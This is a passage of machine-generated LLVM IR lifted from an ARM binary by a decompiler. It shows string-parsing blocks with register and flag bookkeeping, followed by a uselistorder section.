  %v4_a97c = call i32 @function_13b18(i32 %v2_a968, i32 %v2_a96c, i32 ptrtoint (i32* @global_var_143f0.106 to i32), i32 %v0_a970)
  store i32 %v4_a97c, i32* %r0.global-to-local, align 4
  %v0_a980 = load i32, i32* @r8, align 4
  %v1_a980 = add i32 %v0_a980, 12
  %v2_a980 = inttoptr i32 %v1_a980 to i32*
  %v3_a980 = load i32, i32* %v2_a980, align 4
  store i32 %v1_a168, i32* %ip.global-to-local, align 4
  %v1_a988 = and i32 %v3_a980, 33554432
  %v2_a988 = icmp ne i32 %v1_a988, 0
  store i1 %v2_a988, i1* %cpsr_c.global-to-local, align 1
  %v3_a988 = mul i32 %v3_a980, 128
  %v0_a98c = load i32, i32* @r4, align 4
  %v1_a98c = load i32, i32* %sb.global-to-local, align 4
  %v2_a990 = add i32 %v3_a988, %v1_a168
  store i32 %v2_a990, i32* @r5, align 4
  %v2_a98c = add i32 %v0_a98c, %v4_a97c
  %v2_a994 = add i32 %v2_a98c, %v1_a98c
  store i32 %v2_a994, i32* @r4, align 4
  %v0_a998 = load i32, i32* %fp.global-to-local, align 4
  %v1_a998 = trunc i32 %v0_a998 to i8
  %v3_a998 = add i32 %v2_a994, 2115
  %v4_a998 = inttoptr i32 %v3_a998 to i8*
  store i8 %v1_a998, i8* %v4_a998, align 1
  %v0_a99c = load i32, i32* @r5, align 4
  store i32 %v0_a99c, i32* %r0.global-to-local, align 4
  %v1_a9a0 = inttoptr i32 %v0_a99c to i8*
  %v2_a9a0 = call i32 @function_13a54(i8* %v1_a9a0)
  %v0_a9a4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_a9a4, i32* %r1.global-to-local, align 4
  %v0_a9a8 = load i32, i32* @r5, align 4
  %v2_a9a8 = add i32 %v0_a9a8, %v2_a9a0
  store i32 %v2_a9a8, i32* @r0, align 4
  %v2_a9ac = inttoptr i32 %v2_a9a8 to i8*
  %v3_a9ac = call i32 @function_13a7c(i8* %v2_a9ac, i32 %v0_a9a4)
  store i32 %v3_a9ac, i32* %r0.global-to-local, align 4
  %v0_a9b0 = load i32, i32* @r8, align 4
  %v1_a9b0 = add i32 %v0_a9b0, 12
  %v2_a9b0 = inttoptr i32 %v1_a9b0 to i32*
  %v3_a9b0 = load i32, i32* %v2_a9b0, align 4
  %v1_a9b4 = add i32 %v3_a9b0, 1
  store i32 %v1_a9b4, i32* %r3.global-to-local, align 4
  store i32 %v1_a9b4, i32* %v2_a9b0, align 4
  br label %dec_label_pc_a88c

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a5a4
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_a9cc = load i32, i32* @r5, align 4
  %v1_a9cc = add i32 %v0_a9cc, 4
  %v2_a9cc = inttoptr i32 %v1_a9cc to i8*
  %v3_a9cc = load i8, i8* %v2_a9cc, align 1
  %v4_a9cc = zext i8 %v3_a9cc to i32
  store i32 %v4_a9cc, i32* %r3.global-to-local, align 4
  %v2_a9d0 = icmp ugt i8 %v3_a9cc, 114
  store i1 %v2_a9d0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a9d0 = icmp ult i8 %v3_a9cc, 115
  store i1 %v6_a9d0, i1* %cpsr_n.global-to-local, align 1
  %v7_a9d0 = icmp eq i8 %v3_a9cc, 115
  store i1 %v7_a9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a9d0, label %bb242, label %.thread69

bb242:                                            ; preds = %dec_label_pc_a9c0
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread69

.thread69:                                        ; preds = %dec_label_pc_a9c0, %bb242
  %v3_a9e0 = phi i32 [ 7, %dec_label_pc_a9c0 ], [ 8, %bb242 ]
  %v0_a9e4 = load i32, i32* @r7, align 4
  %v1_a9e4 = sub nsw i32 1, %v3_a9e0
  %v2_a9e8 = add i32 %v1_a9e4, %v0_a9e4
  store i32 %v2_a9e8, i32* %r2.global-to-local, align 4
  store i32 %v0_a9cc, i32* %r0.global-to-local, align 4
  %v2_a9f0 = add i32 %v3_a9e0, %v0_a9cc
  store i32 %v2_a9f0, i32* %r1.global-to-local, align 4
  %v3_a9f4 = call i32 @_memmove(i32 %v0_a9cc, i32 %v2_a9f0, i32 %v2_a9e8)
  store i32 %v3_a9f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v0_aa04 = load i32, i32* @r6, align 4
  %v1_aa04 = load i32, i32* @r4, align 4
  %v2_aa04 = add i32 %v1_aa04, %v0_aa04
  %v3_aa04 = inttoptr i32 %v2_aa04 to i8*
  %v4_aa04 = load i8, i8* %v3_aa04, align 1
  %v6_aa04 = zext i8 %v4_aa04 to i32
  store i32 %v6_aa04, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v9_aa08 = icmp eq i8 %v4_aa04, 0
  store i1 %v9_aa08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa08, label %dec_label_pc_aa48, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %.thread69
  %v2_aa10 = icmp ugt i8 %v4_aa04, 46
  store i1 %v2_aa10, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_aa10 = icmp ult i8 %v4_aa04, 47
  store i1 %v6_aa10, i1* %cpsr_n.global-to-local, align 1
  %v7_aa10 = icmp eq i8 %v4_aa04, 47
  store i1 %v7_aa10, i1* %cpsr_z.global-to-local, align 1
  %v1_aa14 = load i32, i32* @r5, align 4
  br i1 %v7_aa10, label %bb243, label %dec_label_pc_aa1c

bb243:                                            ; preds = %dec_label_pc_aa10
  store i32 %v1_aa14, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ab2c

dec_label_pc_aa1c:                                ; preds = %dec_label_pc_aa10
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_aa2c

dec_label_pc_aa24:                                ; preds = %dec_label_pc_aa2c
  %v2_aa24 = icmp ugt i8 %v4_aa34, 46
  store i1 %v2_aa24, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_aa24 = icmp ult i8 %v4_aa34, 47
  store i1 %v6_aa24, i1* %cpsr_n.global-to-local, align 1
  %v7_aa24 = icmp eq i8 %v4_aa34, 47
  store i1 %v7_aa24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa24, label %dec_label_pc_ab2c, label %dec_label_pc_aa2c

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_aa24, %dec_label_pc_aa1c
  %v1_aa3c = phi i32 [ %v1_aa40, %dec_label_pc_aa24 ], [ 1, %dec_label_pc_aa1c ]
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 %v1_aa3c, i32* %stack_var_-40, align 4
  %v2_aa34 = add i32 %v1_aa3c, %v1_aa14
  %v3_aa34 = inttoptr i32 %v2_aa34 to i8*
  %v4_aa34 = load i8, i8* %v3_aa34, align 1
  %v6_aa34 = zext i8 %v4_aa34 to i32
  store i32 %v6_aa34, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_aa38 = icmp eq i8 %v4_aa34, 0
  store i1 %v2_aa38, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_aa34, i32* %r1.global-to-local, align 4
  %v1_aa40 = add i32 %v1_aa3c, 1
  store i32 %v1_aa40, i32* %r3.global-to-local, align 4
  br i1 %v2_aa38, label %dec_label_pc_aa48, label %dec_label_pc_aa24

dec_label_pc_aa48:                                ; preds = %dec_label_pc_aa2c, %.thread69, %dec_label_pc_ab2c
  %v0_aa48 = load i32, i32* @r5, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v1_aa4c = inttoptr i32 %v0_aa48 to i8*
  %v2_aa4c = call i32 @function_13a54(i8* %v1_aa4c)
  store i32 %v2_aa4c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_aa50 = icmp slt i32 %v2_aa4c, 0
  store i1 %v1_aa50, i1* %cpsr_n.global-to-local, align 1
  %v2_aa50 = icmp eq i32 %v2_aa4c, 0
  store i1 %v2_aa50, i1* %cpsr_z.global-to-local, align 1
  %tmp244 = icmp slt i32 %v2_aa4c, 1
  br i1 %tmp244, label %dec_label_pc_aa74, label %dec_label_pc_aa58

dec_label_pc_aa58:                                ; preds = %dec_label_pc_aa48
  %v0_aa58 = load i32, i32* @r5, align 4
  store i32 %v0_aa58, i32* %r0.global-to-local, align 4
  %v1_aa5c = inttoptr i32 %v0_aa58 to i8*
  %v2_aa5c = call i32 @function_13a54(i8* %v1_aa5c)
  store i32 %v2_aa5c, i32* %r0.global-to-local, align 4
  %v1_aa60 = add i32 %v2_aa5c, -127
  %v2_aa60 = icmp ugt i32 %v2_aa5c, 126
  store i1 %v2_aa60, i1* %cpsr_c.global-to-local, align 1
  %v3_aa60 = sub i32 126, %v2_aa5c
  %v4_aa60 = and i32 %v3_aa60, %v2_aa5c
  %v5_aa60 = icmp slt i32 %v4_aa60, 0
  store i1 %v5_aa60, i1* %cpsr_v.global-to-local, align 1
  %v6_aa60 = icmp slt i32 %v1_aa60, 0
  store i1 %v6_aa60, i1* %cpsr_n.global-to-local, align 1
  %v7_aa60 = icmp eq i32 %v2_aa5c, 127
  store i1 %v7_aa60, i1* %cpsr_z.global-to-local, align 1
  %v7_aa64 = icmp sgt i32 %v2_aa5c, 127
  br i1 %v7_aa64, label %.thread72, label %bb245

bb245:                                            ; preds = %dec_label_pc_aa58
  %v8_aa64 = load i32, i32* %sb.global-to-local, align 4
  %v9_aa68 = add i32 %v8_aa64, 789
  store i32 %v9_aa68, i32* %r0.global-to-local, align 4
  %v8_aa6c = load i32, i32* @r5, align 4
  store i32 %v8_aa6c, i32* %r1.global-to-local, align 4
  br label %.thread72

.thread72:                                        ; preds = %dec_label_pc_aa58, %bb245
  store i32 43636, i32* %lr.global-to-local, align 4
  %v3_aa70 = xor i1 %v6_aa60, %v5_aa60
  %v4_aa70 = or i1 %v7_aa60, %v3_aa70
  call void @__pseudo_cond_branch(i1 %v4_aa70, i32 ptrtoint (i32* @global_var_13a7c.104 to i32))
  br label %dec_label_pc_aa74

dec_label_pc_aa74:                                ; preds = %dec_label_pc_aa48, %.thread72
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_aa78 = load i32, i32* %stack_var_-40, align 4
  %v0_aa7c = load i32, i32* @r5, align 4
  %v2_aa7c = add i32 %v3_aa78, 1
  %v1_aa80 = add i32 %v2_aa7c, %v0_aa7c
  store i32 %v1_aa80, i32* %r0.global-to-local, align 4
  %v1_aa84 = inttoptr i32 %v1_aa80 to i8*
  %v2_aa84 = call i32 @function_13a54(i8* %v1_aa84)
  store i32 %v2_aa84, i32* %r0.global-to-local, align 4
  %v1_aa88 = add i32 %v2_aa84, -255
  %v2_aa88 = icmp ugt i32 %v2_aa84, 254
  store i1 %v2_aa88, i1* %cpsr_c.global-to-local, align 1
  %v3_aa88 = sub i32 254, %v2_aa84
  %v4_aa88 = and i32 %v3_aa88, %v2_aa84
  %v5_aa88 = icmp slt i32 %v4_aa88, 0
  store i1 %v5_aa88, i1* %cpsr_v.global-to-local, align 1
  %v6_aa88 = icmp slt i32 %v1_aa88, 0
  store i1 %v6_aa88, i1* %cpsr_n.global-to-local, align 1
  %v7_aa88 = icmp eq i32 %v2_aa84, 255
  store i1 %v7_aa88, i1* %cpsr_z.global-to-local, align 1
  %v8_aa8c = icmp sgt i32 %v2_aa84, 255
  br i1 %v8_aa8c, label %dec_label_pc_a5dc, label %dec_label_pc_aa90

dec_label_pc_aa90:                                ; preds = %dec_label_pc_aa74
  %v0_aa90 = load i32, i32* %sb.global-to-local, align 4
  %v1_aa94 = add i32 %v0_aa90, 533
  store i32 %v1_aa94, i32* @r4, align 4
  store i32 %v1_aa94, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_aaa0 = call i32 @function_13af4(i32 %v1_aa94, i32 255)
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_aaa8 = load i32, i32* %stack_var_-40, align 4
  %v0_aaac = load i32, i32* @r5, align 4
  %v2_aaac = add i32 %v3_aaa8, 1
  %v1_aab0 = add i32 %v2_aaac, %v0_aaac
  store i32 %v1_aab0, i32* %r0.global-to-local, align 4
  %v1_aab4 = inttoptr i32 %v1_aab0 to i8*
  %v2_aab4 = call i32 @function_13a54(i8* %v1_aab4)
  store i32 %v2_aab4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_aab8 = icmp slt i32 %v2_aab4, 0
  store i1 %v1_aab8, i1* %cpsr_n.global-to-local, align 1
  %v2_aab8 = icmp eq i32 %v2_aab4, 0
  store i1 %v2_aab8, i1* %cpsr_z.global-to-local, align 1
  %tmp246 = icmp slt i32 %v2_aab4, 1
  br i1 %tmp246, label %dec_label_pc_a5dc, label %dec_label_pc_aac0

dec_label_pc_aac0:                                ; preds = %dec_label_pc_aa90
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v3_aac4 = load i32, i32* %stack_var_-40, align 4
  %v0_aac8 = load i32, i32* @r5, align 4
  %v0_aacc = load i32, i32* @r4, align 4
  store i32 %v0_aacc, i32* @r0, align 4
  %v2_aac8 = add i32 %v3_aac4, 1
  %v1_aad0 = add i32 %v2_aac8, %v0_aac8
  store i32 %v1_aad0, i32* %r1.global-to-local, align 4
  %v2_aad4 = inttoptr i32 %v0_aacc to i8*
  %v3_aad4 = call i32 @function_13a7c(i8* %v2_aad4, i32 %v1_aad0)
  store i32 %v3_aad4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a5dc

dec_label_pc_aadc:                                ; preds = %dec_label_pc_a344
  %v0_aadc = load i32, i32* @r4, align 4
  %v1_aadc = trunc i32 %v0_aadc to i8
  %v2_aadc = load i32, i32* @r8, align 4
  %v3_aadc = add i32 %v2_aadc, -1452
  %v4_aadc = inttoptr i32 %v3_aadc to i8*
  store i8 %v1_aadc, i8* %v4_aadc, align 1
  br label %dec_label_pc_9590

dec_label_pc_aae4:                                ; preds = %dec_label_pc_a55c
  %v1_aae4 = add i32 %v0_aae4, 1
  store i32 %v1_aae4, i32* %ip.global-to-local, align 4
  %v2_aae8 = add i32 %v0_a55c, %v1_aae4
  store i32 %v2_aae8, i32* %r4.global-to-local, align 4
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  store i32 %v2_aae8, i32* %r0.global-to-local, align 4
  store i32 %v1_aae4, i32* %stack_var_-40, align 4
  %v1_aaf8 = inttoptr i32 %v2_aae8 to i8*
  %v2_aaf8 = call i32 @function_13a54(i8* %v1_aaf8)
  store i32 %v2_aaf8, i32* %r0.global-to-local, align 4
  %v0_aafc = load i32, i32* %r4.global-to-local, align 4
  %v2_aafc = add i32 %v0_aafc, %v2_aaf8
  %v1_ab00 = add i32 %v2_aafc, -1
  %v2_ab00 = inttoptr i32 %v1_ab00 to i8*
  %v3_ab00 = load i8, i8* %v2_ab00, align 1
  %v4_ab00 = zext i8 %v3_ab00 to i32
  store i32 %v4_ab00, i32* %r3.global-to-local, align 4
  %v2_ab04 = icmp ugt i8 %v3_ab00, 33
  store i1 %v2_ab04, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_ab04 = icmp ult i8 %v3_ab00, 34
  store i1 %v6_ab04, i1* %cpsr_n.global-to-local, align 1
  %v7_ab04 = icmp eq i8 %v3_ab00, 34
  store i1 %v7_ab04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ab04, label %dec_label_pc_ab0c, label %dec_label_pc_a568

dec_label_pc_ab0c:                                ; preds = %dec_label_pc_aae4
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v3_ab10 = load i32, i32* %stack_var_-40, align 4
  %v0_ab14 = load i32, i32* @r6, align 4
  %v2_ab14 = add i32 %v0_ab14, %v3_ab10
  store i32 %v2_ab14, i32* %r4.global-to-local, align 4
  store i32 %v2_ab14, i32* %r0.global-to-local, align 4
  %v1_ab1c = inttoptr i32 %v2_ab14 to i8*
  %v2_ab1c = call i32 @function_13a54(i8* %v1_ab1c)
  store i32 %v2_ab1c, i32* %r0.global-to-local, align 4
  %v2_ab20 = add i32 %v2_ab14, %v2_ab1c
  %v0_ab24 = load i32, i32* @r5, align 4
  %v1_ab24 = trunc i32 %v0_ab24 to i8
  %v3_ab24 = add i32 %v2_ab20, -1
  %v4_ab24 = inttoptr i32 %v3_ab24 to i8*
  store i8 %v1_ab24, i8* %v4_ab24, align 1
  br label %dec_label_pc_a568

dec_label_pc_ab2c:                                ; preds = %dec_label_pc_aa24, %bb243
  %v2_ab30 = phi i32 [ %v1_aa14, %bb243 ], [ %v2_aa34, %dec_label_pc_aa24 ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_ab30 = inttoptr i32 %v2_ab30 to i8*
  store i8 0, i8* %v3_ab30, align 1
  br label %dec_label_pc_aa48

dec_label_pc_ab38:                                ; preds = %dec_label_pc_a5d0
  store i32 %v10_9048, i32* %ip.global-to-local, align 4
  %v3_ab3c = load i32, i32* %stack_var_-40, align 4
  %v0_ab40 = load i32, i32* @r5, align 4
  %v2_ab40 = add i32 %v3_ab3c, 1
  %v1_ab44 = add i32 %v2_ab40, %v0_ab40
  store i32 %v1_ab44, i32* %r0.global-to-local, align 4
  %v1_ab48 = inttoptr i32 %v1_ab44 to i8*
  %v2_ab48 = call i32 @function_13a54(i8* %v1_ab48)
  store i32 %v2_ab48, i32* %r0.global-to-local, align 4
  %v1_ab4c = add i32 %v2_ab48, -255
  %v2_ab4c = icmp ugt i32 %v2_ab48, 254
  store i1 %v2_ab4c, i1* %cpsr_c.global-to-local, align 1
  %v3_ab4c = sub i32 254, %v2_ab48
  %v4_ab4c = and i32 %v3_ab4c, %v2_ab48
  %v5_ab4c = icmp slt i32 %v4_ab4c, 0
  store i1 %v5_ab4c, i1* %cpsr_v.global-to-local, align 1
  %v6_ab4c = icmp slt i32 %v1_ab4c, 0
  store i1 %v6_ab4c, i1* %cpsr_n.global-to-local, align 1
  %v7_ab4c = icmp eq i32 %v2_ab48, 255
  store i1 %v7_ab4c, i1* %cpsr_z.global-to-local, align 1
  %v8_ab50 = icmp sgt i32 %v2_ab48, 255
  br i1 %v8_ab50, label %dec_label_pc_a5dc, label %dec_label_pc_ab54

dec_label_pc_ab54:                                ; preds = %dec_label_pc_ab38
  %v0_ab54 = load i32, i32* %sb.global-to-local, align 4
  %v1_ab58 = add i32 %v0_ab54, 533
  store i32 %v1_ab58, i32* @r4, align 4
  store i32 %v1_ab58, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_ab64 = call i32 @function_13af4(i32 %v1_ab58, i32 255)
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_ab6c = load i32, i32* %stack_var_-40, align 4
  %v0_ab70 = load i32, i32* @r5, align 4
  %v2_ab70 = add i32 %v3_ab6c, 1
  %v1_ab74 = add i32 %v2_ab70, %v0_ab70
  store i32 %v1_ab74, i32* %r0.global-to-local, align 4
  %v1_ab78 = inttoptr i32 %v1_ab74 to i8*
  %v2_ab78 = call i32 @function_13a54(i8* %v1_ab78)
  store i32 %v2_ab78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_ab7c = icmp slt i32 %v2_ab78, 0
  store i1 %v1_ab7c, i1* %cpsr_n.global-to-local, align 1
  %v2_ab7c = icmp eq i32 %v2_ab78, 0
  store i1 %v2_ab7c, i1* %cpsr_z.global-to-local, align 1
  %tmp247 = icmp slt i32 %v2_ab78, 1
  br i1 %tmp247, label %dec_label_pc_a5dc, label %dec_label_pc_ab84

dec_label_pc_ab84:                                ; preds = %dec_label_pc_ab54
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_ab88 = load i32, i32* %stack_var_-40, align 4
  %v0_ab8c = load i32, i32* @r5, align 4
  %v0_ab90 = load i32, i32* @r4, align 4
  store i32 %v0_ab90, i32* @r0, align 4
  %v2_ab8c = add i32 %v3_ab88, 1
  %v1_ab94 = add i32 %v2_ab8c, %v0_ab8c
  store i32 %v1_ab94, i32* %r1.global-to-local, align 4
  %v2_ab98 = inttoptr i32 %v0_ab90 to i8*
  %v3_ab98 = call i32 @function_13a7c(i8* %v2_ab98, i32 %v1_ab94)
  store i32 %v3_ab98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a5dc

dec_label_pc_abc8:                                ; preds = %dec_label_pc_919c, %dec_label_pc_91d4
  %v0_9220 = call i32 @function_10bd8()
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_9228 = urem i32 %v0_9220, 5
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_922c = icmp ult i32 %v2_9228, 4
  store i1 %v6_922c, i1* %cpsr_n.global-to-local, align 1
  %v7_922c = icmp eq i32 %v2_9228, 4
  store i1 %v7_922c, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_ac30 = call i32 @function_13128(i32 47)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_ac3c = call i32 @function_13044(i32 47, i32* null)
  store i32 %v3_ac3c, i32* %r1.global-to-local, align 4
  %v0_ac44 = load i32, i32* @r5, align 4
  %v1_ac44 = add i32 %v0_ac44, 20
  store i32 %v1_ac44, i32* @r0, align 4
  %v2_ac48 = inttoptr i32 %v1_ac44 to i8*
  %v3_ac48 = call i32 @function_13a7c(i8* %v2_ac48, i32 %v3_ac3c)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_ac50 = call i32 @function_13070(i32 47)
  %v0_abc8 = load i32, i32* @sl, align 4
  store i32 %v0_abc8, i32* %r1.global-to-local, align 4
  store i32 %v0_9164, i32* @r0, align 4
  %v2_abd0 = inttoptr i32 %v0_9164 to i8*
  %v3_abd0 = call i32 @function_13a7c(i8* %v2_abd0, i32 %v0_abc8)
  store i32 %v3_abd0, i32* %r0.global-to-local, align 4
  store i32 %v0_90f4, i32* %r1.global-to-local, align 4
  %v0_abd8 = load i32, i32* @r7, align 4
  %v1_abd8 = add i32 %v0_abd8, 1
  store i32 %v1_abd8, i32* @r7, align 4
  %v0_abdc = load i32, i32* @r5, align 4
  %v2_abe0 = sub i32 %v0_90f4, %v1_abd8
  %v3_abe0 = icmp uge i32 %v0_90f4, %v1_abd8
  store i1 %v3_abe0, i1* %cpsr_c.global-to-local, align 1
  %v4_abe0 = xor i32 %v1_abd8, %v0_90f4
  %v5_abe0 = xor i32 %v2_abe0, %v0_90f4
  %v6_abe0 = and i32 %v5_abe0, %v4_abe0
  %v7_abe0 = icmp slt i32 %v6_abe0, 0
  store i1 %v7_abe0, i1* %cpsr_v.global-to-local, align 1
  %v8_abe0 = icmp slt i32 %v2_abe0, 0
  store i1 %v8_abe0, i1* %cpsr_n.global-to-local, align 1
  %v9_abe0 = icmp eq i32 %v0_90f4, %v1_abd8
  store i1 %v9_abe0, i1* %cpsr_z.global-to-local, align 1
  %v1_abe4 = add i32 %v0_abdc, 3140
  store i32 %v1_abe4, i32* @r5, align 4
  br i1 %v9_abe0, label %dec_label_pc_abec, label %dec_label_pc_9124

dec_label_pc_abec:                                ; preds = %dec_label_pc_abc8
  %v1_abf8 = add i32 %v2_9108, 1456
  %v0_ac00 = load i32, i32* %r8.global-to-local, align 4
  %v1_ac00 = urem i32 %v0_ac00, 256
  store i32 %v1_ac00, i32* %ip.global-to-local, align 4
  %v1_ac04 = add i32 %v2_9108, 1464
  store i32 %v1_ac04, i32* %r2.global-to-local, align 4
  %v2_ac08 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_ac08, i32* %r3.global-to-local, align 4
  store i32 %v1_abf8, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_9280.preheader

; uselistorder directives
  uselistorder i32 %v2_ac08, { 1, 0 }
  uselistorder i32 %v1_ac04, { 1, 0 }
  uselistorder i32 %v1_abf8, { 1, 0 }
  uselistorder i32 %v1_abe4, { 1, 0 }
  uselistorder i32 %v2_abe0, { 1, 0 }
  uselistorder i32 %v1_abd8, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v2_9228, { 1, 0 }
  uselistorder i32 %v2_ab48, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_aae4, { 1, 0, 2 }
  uselistorder i32 %v2_aa84, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_aa5c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_aa40, { 1, 0 }
  uselistorder i8 %v4_aa34, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_aa3c, { 1, 0, 2 }
  uselistorder i1 %v7_aa24, { 1, 0 }
  uselistorder i32 %v1_aa14, { 1, 0, 2 }
  uselistorder i1 %v7_aa10, { 1, 0 }
  uselistorder i1 %v9_aa08, { 1, 0 }
  uselistorder i32 %v2_a9e8, { 1, 0 }
  uselistorder i32 %v0_a9cc, { 2, 0, 1, 3 }
  uselistorder i32 %v2_a968, { 1, 0, 2 }
  uselistorder i32 %v1_a960, { 1, 0, 2 }
  uselistorder i32 %v2_a918, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_a8ec, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v3_a870, { 5, 1, 0, 4, 3, 2, 6 }
  uselistorder i32 %v2_a854, { 1, 0, 2 }
  uselistorder i32 %v4_a84c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_a814, { 1, 0 }
  uselistorder i32 %v1_a814, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_a814, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v2_a77c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_a754, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_a734, { 1, 0 }
  uselistorder i8 %v4_a72c, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v0_a734, { 1, 0, 3, 2 }
  uselistorder i1 %v7_a718, { 1, 0 }
  uselistorder i32 %v1_a708, { 1, 0, 2 }
  uselistorder i1 %v7_a704, { 1, 0 }
  uselistorder i32 %v0_a6c4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_a6a8, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v5_a5c4, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v2_a598, { 1, 0 }
  uselistorder i32 %v1_a598, { 2, 0, 1, 3 }
  uselistorder i32 %v2_a594, { 3, 0, 1, 4, 2 }
  uselistorder i32 %v1_a574, { 0, 2, 1, 3 }
  uselistorder i32 %v0_a55c, { 1, 0 }
  uselistorder i32 %v0_aae4, { 1, 0 }
  uselistorder i32 %v1_a518, { 1, 2, 0 }
  uselistorder i32 %v5_a514, { 0, 2, 1, 3 }
  uselistorder i32 %v0_a500, { 1, 0 }
  uselistorder i32 %v2_a4f4, { 1, 0, 2 }
  uselistorder i32 %v1_a4b8, { 0, 2, 1 }
  uselistorder i32 %v1_a4a8, { 1, 0, 3, 4, 2 }
  uselistorder i32 %v1_a494, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a450, { 1, 2, 0 }
  uselistorder i32 %v5_a44c, { 1, 8, 2, 3, 6, 7, 5, 4, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_a434.v4_a414, { 1, 0, 2 }
  uselistorder i32 %v1_a3f0, { 1, 2, 0 }
  uselistorder i32 %v4_a3e8, { 0, 2, 1, 3 }
  uselistorder i32 %v2_a3a8, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v2_a3a0, { 1, 2, 0 }
  uselistorder i32 %v4_a394, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_a320, { 1, 2, 0 }
  uselistorder i32 %v4_a31c, { 0, 2, 1, 3 }
  uselistorder i32 %v5_a2fc, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a2e4, { 1, 2, 0 }
  uselistorder i32 %v5_a2e0, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a2c8, { 1, 0 }
  uselistorder i32 %v2_a2c0, { 1, 2, 0 }
  uselistorder i32 %v4_a2bc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_a280, { 2, 1, 0 }
  uselistorder i32 %v3_a274, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v3_a254, { 4, 5, 6, 7, 3, 1, 2, 0 }
  uselistorder i32* %v2_a254, { 1, 0 }
  uselistorder i32 %v0_a254, { 1, 0 }
  uselistorder i32 %v3_a23c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_a230, { 1, 2, 0 }
  uselistorder i32 %v0_a218, { 0, 2, 1 }
  uselistorder i32 %v3_a1f8, { 0, 3, 4, 2, 1, 5 }
